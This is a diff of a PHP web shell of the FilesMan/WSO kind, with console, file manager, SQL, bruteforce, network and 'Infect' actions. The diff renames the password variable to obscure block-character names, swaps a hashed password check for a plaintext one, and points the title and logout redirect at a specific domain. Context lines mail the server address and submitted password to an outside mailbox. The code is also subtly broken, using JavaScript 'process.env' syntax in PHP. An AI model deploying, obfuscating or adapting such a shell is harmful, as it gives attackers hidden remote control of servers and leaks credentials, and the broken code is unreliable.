@@ -4,7 +4,7 @@ if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$pw_encrypt = process.env.pw_encrypt;
+$▛ = process.env.en;
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
@@ -38,10 +38,10 @@ if(get_magic_quotes_gpc()) {
     $_COOKIE = stripslashes_array($_COOKIE);
 }
 /* (С) 11.2011 oRb */
-if(!empty($pw_encrypt)) {
-    if(isset($_POST['pass']) && (md5($_POST['pass']) == $pw_encrypt))
-        prototype(md5($_SERVER['HTTP_HOST']), $pw_encrypt);
-    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $pw_encrypt))
+if(!empty($▛)) {
+    if(isset($_POST['pass']) && ($_POST['pass'] == $▛))
+        prototype(md5($_SERVER['HTTP_HOST']), $▛);
+    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $▛))
         hardLogin();
 }
 if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
@@ -80,7 +80,7 @@ if($cwd[strlen($cwd)-1] != '/')
 function hardHeader() {
 	if(empty($_POST['charset']))
 		$_POST['charset'] = $GLOBALS['▜'];
-	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>!!Authorized only!!</title>
+	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>labs.danicfonte.cf</title>
     <link href='https://fonts.googleapis.com/css?family=Nunito' rel='stylesheet'>
     <link rel='stylesheet' href='https://cdn.rawgit.com/kimeiga/bahunya/css/bahunya-0.1.3.css'>
 <style>
@@ -221,7 +221,7 @@ function hardHeader() {
 	foreach($charsets as $▟)
 		$opt_charsets .= '<option value="'.$▟.'" '.($_POST['charset']==$▟?'selected':'').'>'.$▟.'</option>';
 	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');
-	if(!empty($GLOBALS['pw_encrypt']))
+	if(!empty($GLOBALS['▛']))
 	$m['Logout'] = 'Logout';
 	$m['Self remove'] = 'SelfRemove';
 	$menu = '';
@@ -1094,7 +1094,7 @@ function actionSafeMode() {
 }
 function actionLogout() {
     setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
-	die("<meta http-equiv='refresh' content='1;URL=#' />  <p>successfully exited.</p>");
+	die("<meta http-equiv='refresh' content='1;URL=//labs.danicfonte.cf' />  <p>successfully exited.</p>");
 }
 function actionSelfRemove() {
 	if($_POST['p1'] == 'yes')
